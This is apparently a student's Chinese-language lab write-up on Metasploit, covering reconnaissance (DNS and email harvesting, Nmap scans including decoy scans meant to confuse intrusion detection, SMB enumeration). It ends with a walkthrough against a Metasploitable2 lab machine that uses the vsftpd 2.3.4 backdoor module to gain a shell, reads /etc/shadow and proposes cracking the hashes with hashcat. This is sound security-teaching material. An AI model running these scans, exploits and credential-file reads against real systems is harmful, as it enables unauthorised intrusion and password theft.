---
layout: post
title: "hust破防实践3 实验一 metasploit"
date:   2022-5-7
tags: [web]
comments: true
author: wsxk
---

未完待续....

- [metasploit简介](#metasploit简介)
  - [metasploit基本模块](#metasploit基本模块)
    - [常用命令](#常用命令)
- [信息收集](#信息收集)
  - [1、被动信息收集](#1被动信息收集)
    - [metasploit被动收集](#metasploit被动收集)
  - [2、主动信息收集](#2主动信息收集)
    - [一、TCP端口扫描](#一tcp端口扫描)
    - [二、TCP SYN 扫描](#二tcp-syn-扫描)
    - [三、端口扫描 Nmap方式](#三端口扫描-nmap方式)
      - [更多操作系统和版本检测](#更多操作系统和版本检测)
      - [高级选项：开放端口服务的版本检测](#高级选项开放端口服务的版本检测)
      - [隐蔽扫描](#隐蔽扫描)
    - [四、端口扫描：db_nmap 方式](#四端口扫描db_nmap-方式)
    - [五、Nmap 脚本引擎](#五nmap-脚本引擎)
    - [六、基于ARP 的主机发现](#六基于arp-的主机发现)
    - [七、UDP 服务识别](#七udp-服务识别)
    - [八、SMB扫描和枚举](#八smb扫描和枚举)
  - [3、社会工程学](#3社会工程学)
- [实战](#实战)
  - [1.IP地址](#1ip地址)
  - [2.密码设置](#2密码设置)
  - [3.端口扫描](#3端口扫描)
- [参考](#参考)


## metasploit简介

Metasploit 是目前世界上领先的渗透测试工具，也是信息安全与渗透测试 领域最大的开源项目之一。它彻底改变了我们执行安全测试的方式。Metasploit 之所以流行，是因为它可以执行广泛的安全测试任务，从而简化渗透测试的工作。 Metasploit 适用于所有流行的操作系统，本实验中，主要以 Kali Linux 为主。 因为 Kali Linux 预装了 Metasploit 框架和运行在框架上的其他第三方工具

### metasploit基本模块

1. 渗透攻击模块（exploit）：

        利用发现的安全漏洞或配置弱点对远程目标 系统进行攻击的代码： 
        （1）主动渗透模块（服务端渗透） 
        （2）被动渗透模块（客户端渗透）

2. 辅助模块(Aux)：
   

        实现信息收集及口令猜测、Dos 攻击等无法直接取得服 务器权限的攻击。这里主要用到 Msf 里 auxiliary 里边的 modules，这里的 modules 都是些渗透前期的辅助工具。

3. 攻击载荷模块(payload):
    
        攻击载荷是在渗透攻击成功后促使目标系统运 行的一段植入代码

4. 空指令模块(Nop)：

        空指令（NOP)是一些对程序运行状态不会造成任何实 质影响的空操作或无关操作指令， 最典型的空指令就是空操作，在 X86 CPU 体 系结构。平台上的操作码是 ox90. 在渗透攻击构造邪恶数据缓冲区时，常常要 在真正要执行的 Shellcode 之前添加一段空指令区， 这样当触发渗透攻击后跳 转执行 ShellCode 时，有一个较大的安全着陆区，从而避免受到内存 地址随机 化、返回地址计算偏差等原因造成的 ShellCode 执行失败，提高渗透攻击的可靠 性。

5. 编码器模块（encode）：
        
        攻击载荷与空指令模块组装完成一个指令序列 后，在这段指令被渗透攻击模块加入邪恶数据 缓冲区交由目标系统运行之前， Metasploit 框架还需要完成一道非常重要的工序—-编码。 编码模块的第 一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符“。 编码器第二个使命是对攻击载荷进行”免杀“处理，即逃避反病毒软件、IDS 入 侵检测系统和 IPS 入侵防御系统的检测与阻断。

6. 后渗透模块（post）:

        用于维持访问

#### 常用命令

    show exploits – 查看所有可用的渗透攻击程序代码 
    show auxiliary – 查看所有可用的辅助攻击工具 
    show options – 查看该模块所有可用选项 
    show payloads – 查看该模块适用的所有载荷代码 
    show targets – 查看该模块适用的攻击目标类型
    search – 根据关键字搜索某模块 
    info – 显示某模块的详细信息 
    use – 进入使用某渗透攻击模块 
    back – 回退 
    set/unset – 设置/禁用模块中的某个参数 
    setg/unsetg – 设置/禁用适用于所有模块的全局参数 
    save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用


## 信息收集

信息收集是渗透测试的第一步，也是很关键的一步

### 1、被动信息收集

这种方式是指在不物理连接或访问目标的时候，获取目 标的相关信息，这意味着我们需要使用其他信息来源获得目标信息。比如查询 whois 信息。假设我们的目标是一个在线的 Web 服务，那么通过 whois 查询可以 获得它的 ip 地址，域名信息，子域信息，服务器位置信息等。

#### metasploit被动收集

主要用了 auxiliary/gather/enum_dns的模块

使用如下命令：

    use auxiliary/gather/enum_dns  //使用这个模块

    set domain packtpub.com  //设置想查询的域名

    set threads 10  //设置线程数量

    run

跑完后会有如下结果

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1.png)

这里有必要解释一下 NS、SOA等等是什么意思，它们都是DNS资源记录的一种类型

资源记录是用于答复DNS客户端请求的DNS数据库记录，每一个DNS服务器包含了它所管理的DNS命名空间的所有资源记录。资源记录包含和特定主机有关的信息，如IP地址、提供服务的类型等等。常见的资源记录类型有：SOA（起始授权结构）、A（主机）、NS（名称服务器）、CNAME（别名）和MX（邮件交换器）。


我们还可以用metasploit对目标相关的邮箱信息进行收集

    use auxiliary/gather/search_email_collector
    set domain packtpub.com
    run

这个模块主要是利用google、Bing、Yahoo强大的搜索引擎进行搜索

可以得到如下结果

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/2.png)


metasploit还可以进行蜜罐探测（蜜罐就是防御方故意为黑客设置的有弱点的网站，说白了就是陷阱）

检测目标是否为蜜罐，避免浪费时间或因为试图攻击蜜罐而被封锁。使用Shodan Honeyscore Client模块，可以利用Shodan搜索引擎检测目标是否为蜜罐。结果返回为0到1的评级分数，如果是1，则是一个蜜罐




### 2、主动信息收集

这种方式是指与目标建立逻辑连接获取信息，这种方式 可以进一步的为我们提供目标信息，让我们对目标的安全性进一步理解。在端口 扫描中，使用最常用的主动扫描技术，探测目标开放的端口和服务

metasploit里也提供了很多的扫描工具，用search portscan 查看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/3.png)

#### 一、TCP端口扫描

可以用

        use auxiliary/scanner/portscan/tcp

来进行TCP端口扫描

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.png)

#### 二、TCP SYN 扫描

相对普通的 TCP 扫描来说，SYN 扫描速度更快，因为它不会完成 TCP 三次握 手，而且可以在一定程度上躲避防火墙和入侵检测系统的检测。 

使用的模块是 auxiliary/scanner/portscan/syn，使用该模块，需要指定端口范围。

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.png)

#### 三、端口扫描 Nmap方式

Nmap 是安全人员首选的强大网络扫描工具，我们将从初级到高级，详细分析 Nmap 的各种扫描技术。 

Nmap 提供了许多种不同的扫描方是，这里我们只重点讨论这三种，即 TCP 连接扫描、SYN 隐蔽扫描和 UDP 扫描。

可以将 Nmap 的不同扫描选项组合到一起使 用，已便对目标进行更高级和更复杂的扫描。 

在渗透测试中，扫描过程可以提供很多有用的结果。扫描中收集的信息构成 了后续渗透测试的基础，因此强烈建议你掌握扫描类型的相关知识，让我们更深 入了解下我们刚刚学习的这些扫描技术


        1.TCP 连接扫描。
        它使用操作系统网络功能建立连接，扫描程序向目标发送 SYN数据包，如果端口开放，目标会返回 ACK 消息。然后扫描程序向目标发送 ACK 报 文，成功建立连接，这就是所谓的三次握手过程。连接打开后立即终止，这种技 术有它的优点，但很容易被防火墙和 IDS 检测到

        2.SYN 扫描是另一种类型的 TCP 扫描，但它不会与目标建立完整的连接。 它 不使用操作系统的网络功能，而上生成原始 IP 包并监视响应报文。如果目标端 口是开放的，目标会响应 ACK 消息，然后扫描程序会发送 RST 结束连接。因此又 称为半开扫描。这也被认为是一种隐蔽扫描技术，可以避免被一些防火墙和 IDS 检测到

        3. UDP 扫描是一种无连接扫描技术，因此，无论目标是否收到数据包，都不会 返回信息给扫描程序。如果目标端口关闭，则扫描程序会收到 ICMP 端口不可达 的消息。如果没有消息，扫描器会认为端口是开放的。由于防火墙会阻止数据包， 此方法会返回错误结果，因此不会生成响应消息，扫描器会报告端口为打开状态

你可以直接在msfconsole中运行Nmap，但是如果要将结果导入到Metasploit数据库中，需要使用-oX选项导出XML格式的报告文件，然后使用db_import命令将结果导入进来。


        nmap -sT 192.168.237.140 # TCP端口扫描
        nmap -sS 192.168.237.140 -p 22-5000 # TCP SYN 扫描

大多数情况下，TCP连接扫描和SYN扫描输出结果是相似的，唯一的区别是,SYN 更难被防火墙和 IDS 检测到。当然现代的防火墙几乎都能捕获 SYN 扫描，-p 参数设置我们想要扫描的端口范围

        nmap -sU 192.168.237.140 #UDP扫描，很慢（

##### 更多操作系统和版本检测

        nmap -O 192.168.237.140

查看操作系统和版本号

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.png)

##### 高级选项：开放端口服务的版本检测

另外一种广泛使用的高级选项是对开放端口服务的版本检测，参数是-sV。 它可以与之前的扫描参数结合使用

        nmap -sT -sV 192.168.237.140

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/7.png)

##### 隐蔽扫描

有时候必须以隐蔽方式进行扫描，默认情况下，防火墙和IDS日志会记录你的IP，nmap中提供了-D选项来增加迷惑性。

此选项并不能阻止防火墙和IDS记录你的IP，只是增加迷惑性，它会通过添加其他IP地址，让目标以为是多个IP在攻击。比如，你添加了两个诱导IP，防火墙或IDS日志会显示数据包是从三个不同的IP地址发送的，一个是你的，其他两个是你添加的虚假地址。

        nmap -sT 192.168.237.140 -D 192.168.237.34,192.168.237.56

这个例子中-D后面的IP地址是虚假的IP地址，它会和原始IP地址一同出现在目标机器的网络日志文件中，这会迷惑对方的网络管理员，让他们以为这三个IP都是伪造的。但不能添加太多虚假IP地址，不然会影响扫描结果。因此，只要使用一定数量的地址就行

#### 四、端口扫描：db_nmap 方式

使用 db_nmap 的好处在于可以将结果直接存储到 Metasploit 数据库中，而不再需要 db_import 进行导入

        db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --versionall 192.168.237.140 -p -

        -Pn：跳过主机发现过程

        -sTV：TCP扫描和检测开放端口服务版本信息

        -T4：设置时间模板，加速扫描

        --open：只显示开放端口

        --min-parallelism：探测报文的并发数

        --version-all：尝试每个探测，保证对每个端口尝试每个探测报文，获取服务更具体的版本

        -p -：表示扫描所有的端口（1-65535）

#### 五、Nmap 脚本引擎

Nmap脚本引擎（NSE）是Nmap最强大和最灵活的特性之一，它可以将Nmap转为漏洞扫描器使用。NSE有超过600个脚本，分为好几类，有非侵入式的，也有侵入式的，比如暴力破解，漏洞利用和拒绝服务攻击。你可以在Kali的/user/share/nmap/scripts目录中找到这些脚本。或者用locate搜索*.nse也可以找到。

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/8.png)

用法

        nmap --script <scriptname> <host ip>

#### 六、基于ARP 的主机发现

通过ARP请求可以枚举本地网络中的存活主机，为我们提供了一种简单而快速识别目标方法

使用 ARP 扫描模块（auxiliary/scanner/discovery/arp_sweep），设置 目标地址范围和并发线程，然后运行

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/9.png)

#### 七、UDP 服务识别

UDP服务扫描模块运行我们检测模板系统的UDP服务。由于UDP是一个无连接协议（不面向连接），所以探测比TCP困难。使用UDP服务探测模块可以帮助我们找到一些有用的信息。

        use auxiliary/scanner/discovery/udp_sweep

        set RHOSTS 192.168.237.140/32

        run

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/10.png)


#### 八、SMB扫描和枚举

多年来，SMB协议（一种在 Microsoft Windows系统中使用网络文件共享的协议）已被证明是最容易被攻击的协议之一，它允许攻击者枚举目标文件和用户，甚至远程代码执行

        auxiliary/scanner/smb/smb_enumshares
        set RHOSTS 192.168.237.140
        run

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-7-%E7%A0%B4%E9%98%B2%E5%AE%9E%E8%B7%B53_metasploit%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/11.png)

SMB共享枚举模块在后续的攻击阶段也非常有用，通过提供凭据，可以轻松的枚举共享和文件列表

....

像一些服务还有很多很多，像HTTP扫描、FTP扫描、SSH版本扫描、SMTP枚举、SNMP枚举....


### 3、社会工程学

注： 这种方式主要是利用人的行为和心理漏洞，metasploit当然是不提供这个功能的。

这种方式类似于被动信息收集，主要是针对人为错误，信 息以打印输出、电话交谈、电子邮件等形式泄露。使用这种方法的技术有很多， 收集信息的方式也不尽相同，因此，社会工程学本身就是一个技术范畴

社会工程的受害者被诱骗发布他们没有意识到会被用来攻击企业网络的信 息。例如，企业中的员工可能会被骗向假装是她信任的人透露员工的身份号码。 尽管该员工编号对员工来说似乎没有价值，这使得他在一开始就更容易泄露信息， 但社会工程师可以将该员工编号与收集到的其他信息一起使用，以便更快的找到 进入企业网络的方法

## 实战

对目标机 metasploit2进行攻击

### 1.IP地址

攻击机IP：192.168.237.128

靶机IP：192.168.237.140

### 2.密码设置

Msfadmin密码: 20001009
Root 密码 ：12345678

### 3.端口扫描

msf tcp端口扫描

发现开放了ftp端口

使用如下命令

        nmap -script ftp-vsftpd-backdoor -p 21 192.168.91.128

发现存在 vsftpd漏洞

        search vsftpd

发现脚本可以用

        use exploit/unix/ftp/vsftpd_234_backdoor
        set rhost 192.168.237.140
        exploit

能成功获得shell

        cat /etc/shadow

获得root对于的密码（md5加密，salt值已经给出了

拿去用hashcat 爆破一下就能出



## 参考

[合天网安实验室](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652850556&idx=1&sn=bbfae36b3cbb012fc498ab3aa20501f3&chksm=bd5935%E2%80%A6)

